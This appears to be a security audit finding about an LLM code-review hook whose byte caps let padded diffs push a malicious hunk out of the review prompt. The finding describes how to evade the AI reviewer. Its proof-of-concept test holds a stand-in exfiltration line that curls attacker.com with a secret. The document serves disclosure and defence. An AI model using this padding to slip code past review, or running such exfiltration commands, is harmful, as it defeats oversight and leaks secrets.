### Title
Byte-cap truncation in `cap_diff_for_prompt` lets padded diffs silently drop the malicious hunk from the review prompt while presenting a benign truncation marker - ([File: plugins/security-guidance/hooks/review_api.py])

### Finding Description
`cap_diff_for_prompt` enforces `DIFF_PER_FILE_BYTES` (80000) and `DIFF_TOTAL_BYTES` (400000) caps by keeping the **prefix** of each file's diff content and dropping everything after the cutoff, replacing the tail with a generic `"... [truncated by security-guidance: ...]"` marker. [1](#0-0) . Files are processed in the order supplied by the caller, and once the running `total` reaches `DIFF_TOTAL_BYTES` any subsequent file's content is entirely replaced with `"[omitted by security-guidance: total diff byte cap reached]"`. [2](#0-1) 

Since the diff content itself is fully attacker-controlled repo content (a normal commit/PR the reviewer will process), an attacker can pad a file with tens of kilobytes of innocuous-looking content before the actually dangerous hunk, or add several large benign files ahead of the target file in the diff-file list, so that: (a) the per-file cap truncates away exactly the dangerous lines while leaving only benign prefix content and an anonymous truncation marker, or (b) the total-byte cap causes the dangerous file's diff to be entirely replaced with the omission marker before the review model ever sees its content. `build_investigate_prompt` calls `cap_diff_for_prompt` and embeds only the capped content into the prompt sent to the LLM. [3](#0-2)  The file path is still listed in the "Changed files" list (capped to the first 50) but with no diff content to analyze, so a reviewer relying on the diff (as instructed: "Unified diff (only + lines are new)") loses visibility into the actual dangerous change.

Nothing in `cap_diff_for_prompt`, `build_investigate_prompt`, or the callers I could inspect (`security_reminder_hook.py`, `diffstate.py`) reorders files by risk, size-normalizes per-hunk content, or flags when a file's dangerous portion was truncated/omitted vs. merely large. `compute_v2_review_set` in `diffstate.py` controls which files enter the review set based on git diff state, not content risk, so it provides no mitigation against this padding attack. [4](#0-3) 

### Impact Explanation
An attacker who controls the diff (any contributor pushing a commit/PR into a repo using this reviewer) can craft padding so that the injected dangerous code (e.g., a backdoor, credential exfiltration, or a change that removes a security control) is truncated out of the LLM prompt while the file still shows up as "reviewed" with no findings. This defeats the core invariant that "prompt assembly must not let untrusted repo content suppress review of dangerous changes," letting a malicious commit slip past automated review undetected — a direct security-guidance bypass with potential downstream impact if code proceeding on this false "clean" signal is merged, executed, or trusted (Cross-repo/cross-session mutation impact if the pipeline auto-merges or auto-acts on review results).

### Likelihood Explanation
Feasibility is high: the attacker only needs write access to a branch/PR that will be diffed (the normal, unprivileged contributor workflow this tool is designed to review). No special permission beyond writing a commit is required, and the byte-cap thresholds (80KB/400KB) are easily reached with a few large auto-generated-looking padding lines or files. It is fully repeatable and deterministic given fixed environment variables.

### Recommendation
- When truncating/omitting content, retain a differential/prioritized view: keep flagged high-risk patterns (added `+` lines that touch entry points/sinks) preferentially rather than a strict byte-prefix cut, or scan for suspicious markers before truncating.
- Reorder files fed into `cap_diff_for_prompt` by risk heuristics (e.g., smaller/security-sensitive paths first) rather than caller-provided order, so padding cannot push a target file past the total cap.
- Emit an explicit, loud warning (separate from routine truncation notices) to the reviewing model and to a human-visible surface whenever any file's diff was omitted/truncated, since that is itself a security-relevant signal that should block "no findings" outcomes rather than silently continue.
- Consider capping based on line-level diff units (each `+`/`-` hunk) rather than raw bytes, and never truncate mid-hunk in the middle of a change.

### Proof of Concept
Unit test in `plugins/security-guidance/hooks/review_api.py` test suite:
```python
def test_cap_diff_hides_malicious_tail():
    padding = "// benign\n" * 9000       # ~90KB of filler
    malicious = "+ os.system(f'curl attacker.com/{secret}')\n"
    files = [("app/handler.py", padding + malicious)]
    capped, dropped = cap_diff_for_prompt(files)
    fp, content = capped[0]
    assert dropped > 0
    # Fails today: malicious payload is truncated away
    assert "os.system" in content, "dangerous line was dropped by per-file byte cap"

def test_total_cap_omits_target_file_entirely():
    big_benign = [(f"vendor/lib_{i}.min.js", "x" * 90000) for i in range(5)]
    target = ("src/auth.py", "+ if True: bypass_auth()\n")
    capped, dropped = cap_diff_for_prompt(big_benign + [target])
    fp, content = dict(capped)["src/auth.py"], None
    entry = dict(capped)["src/auth.py"]
    # Fails today: entry is the generic omission marker, no trace of bypass_auth
    assert "bypass_auth" in entry
```
Both assertions are expected to fail against current `cap_diff_for_prompt` behavior, demonstrating that attacker-controlled padding can suppress the dangerous diff content that reaches the review prompt.

### Citations

**File:** plugins/security-guidance/hooks/review_api.py (L42-64)
```python
    for fp, content in files:
        if len(content) > DIFF_PER_FILE_BYTES:
            dropped += len(content) - DIFF_PER_FILE_BYTES
            content = (
                content[:DIFF_PER_FILE_BYTES]
                + "\n... [truncated by security-guidance: file exceeds per-file byte cap]"
            )
        room = DIFF_TOTAL_BYTES - total
        if room <= 0:
            dropped += len(content)
            out.append(
                (fp, "[omitted by security-guidance: total diff byte cap reached]")
            )
            continue
        if len(content) > room:
            dropped += len(content) - room
            content = (
                content[:room]
                + "\n... [truncated by security-guidance: total diff byte cap reached]"
            )
        total += len(content)
        out.append((fp, content))
    return out, dropped
```

**File:** plugins/security-guidance/hooks/review_api.py (L156-176)
```python
def build_investigate_prompt(
    touched_paths: list[str],
    diff_files: list[tuple[str, str]],
    *,
    context_note: str = "",
) -> str:
    capped, _ = cap_diff_for_prompt(diff_files)
    diff_text = "\n\n".join(
        f"=== DIFF: {fp} ===\n{content}" for fp, content in capped
    )
    return (
        "Review this change for security vulnerabilities.\n\n"
        "Changed files (you may Read these and any other file in the repo):\n"
        + "\n".join(f"  - {p}" for p in touched_paths[:50])
        + context_note
        + "\n\nUnified diff (only + lines are new):\n\n"
        + diff_text
        + extensibility.guidance_block()
        + "\n\nInvestigate per the method in your instructions, then return "
        "the findings list."
    )
```

**File:** plugins/security-guidance/hooks/diffstate.py (L353-434)
```python
def compute_v2_review_set(cwd, baseline_sha, head_at_capture, untracked_at_baseline=None):
    """v2 diff strategy: derive the review set from git state alone.

    review_set = (files dirty vs current HEAD, plus files committed this turn
    when HEAD advanced linearly) ∩ (files whose content differs from the
    pre-turn stash baseline). The first term is immune to checkout/pull
    ballooning; the second filters out the user's untouched pre-turn WIP.
    Falls back to dirty_now alone when no baseline is available.

    untracked_at_baseline: {repo-root-relative path: mtime_ns} captured at
    UPS. `git stash create` doesn't include untracked files, so without this
    snapshot a pre-existing untracked file looks "new since baseline" forever.
    A file is excluded only if it was untracked at baseline AND its mtime is
    unchanged — an in-place edit during the turn is still reviewed.

    Known limitation: a Bash-only turn that's interrupted before Stop fires
    leaves touched_paths empty, so the next UPS re-baselines past those edits.
    v1 never reviews Bash-only turns at all, so v2 is no worse there.

    Returns (absolute paths sorted, diff_base, repo_root, metrics).
    diff_base is "HEAD" unless HEAD advanced linearly this turn (commits),
    in which case it's head_at_capture so committed files produce a diff.
    repo_root is the git toplevel — `git diff --name-only` outputs paths
    relative to it (not to cwd), so the caller's get_git_diff must run
    from there too or pathspecs won't match.

    Also returns the untracked subset of review_set so get_git_diff can do
    a targeted `add -N -- <files>` instead of a whole-tree scan.
    """
    repo = _git_toplevel(cwd) or cwd
    if not isinstance(untracked_at_baseline, dict):
        untracked_at_baseline = {}

    tracked_dirty, untracked = _git_status_porcelain(repo)
    if tracked_dirty is None:
        return [], "HEAD", repo, [], {"dirty_now_count": -1, "changed_since_count": -1, "review_set_count": 0}

    def _unchanged_since_baseline(p):
        base_mtime = untracked_at_baseline.get(p)
        if base_mtime is None:
            return False
        try:
            return os.stat(os.path.join(repo, p)).st_mtime_ns == base_mtime
        except OSError:
            return False

    preexisting_unchanged = {p for p in untracked if _unchanged_since_baseline(p)}
    new_untracked = untracked - preexisting_unchanged
    dirty_now = tracked_dirty | new_untracked

    diff_base = "HEAD"
    current_head = _git_rev_parse_head(repo)
    if (head_at_capture and current_head and head_at_capture != current_head
            and _is_ancestor(repo, head_at_capture, current_head)):
        dirty_now |= _git_name_only(repo, f"{head_at_capture}..HEAD") or set()
        diff_base = head_at_capture

    # changed_since: tracked files vs the stash baseline (no temp index — the
    # stash never contained untracked files anyway), then union with
    # currently-untracked. The previous `include_untracked=True` arm cost a
    # full `git add -N .` (slow in large repos) per call to surface
    # untracked files in the diff output — but `git diff <stash>` already
    # lists them as "only in worktree" without that, and we have the explicit
    # set from status regardless.
    if baseline_sha:
        changed_since = _git_name_only(repo, baseline_sha)
        if changed_since is not None:
            changed_since |= new_untracked
    else:
        changed_since = None
    # changed_since is None on missing baseline OR on git error (e.g. the
    # dangling stash SHA was pruned). Either way, don't intersect with ∅ —
    # that would silently zero the review set. Fall back to dirty_now.
    review_set = (dirty_now & changed_since) if changed_since is not None else dirty_now

    review_paths = [os.path.join(repo, p) for p in sorted(review_set)]
    untracked_in_review = sorted(new_untracked & review_set)
    metrics = {
        "dirty_now_count": len(dirty_now),
        "changed_since_count": len(changed_since) if changed_since is not None else -1,
        "review_set_count": len(review_set),
    }
```
